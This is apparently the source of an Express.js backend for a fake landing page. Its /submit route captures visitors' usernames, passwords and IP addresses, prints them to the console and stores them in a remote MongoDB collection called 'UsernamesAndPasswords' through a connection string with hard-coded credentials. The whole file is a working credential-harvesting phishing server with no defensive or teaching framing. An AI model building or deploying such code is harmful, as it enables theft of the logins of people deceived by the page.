var express = require("express");
var app = express();
var path = require("path");
var bodyParser = require("body-parser");
var mongoose = require("mongoose");

//Set up default mongoose connection
var mongoDB =
	"mongodb+srv://test:test@fake-landing-page.ldj3h.mongodb.net/Testing?retryWrites=true&w=majority";

mongoose.connect(mongoDB, { useNewUrlParser: true, useUnifiedTopology: true });

//Get the default connection
var db = mongoose.connection;

//Define a schema
var Schema = mongoose.Schema;

var uapschema = new Schema({
	username: String,
	password: String,
	ip: String,
});

var numberOfRequests = 0;
// Compile model from schema
var uapmodel = mongoose.model("UsernamesAndPasswords", uapschema);

app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, "public")));

app.get("/", function (req, res) {
	res.sendFile(path.join(__dirname, "/views/index.html"));
});

app.post("/submit", (req, res) => {
	numberOfRequests++;
	console.log(numberOfRequests);
	let username = req.body.username;
	let password = req.body.password;
	console.log(username, password);
	let ip = req.rawHeaders[1];
	uapmodel.create(
		{
			username: username,
			password: password,
			ip: ip,
		},
		function (err, small) {
			if (err) return handleError(err);
			// saved!
		}
	);

	res.sendStatus(200);
});

let port = process.env.PORT || 8081;
var server = app.listen(port, function () {
	var host = server.address().address;
	var port = server.address().port;
	console.log(`App listening at http://${host}:${port}`);
});
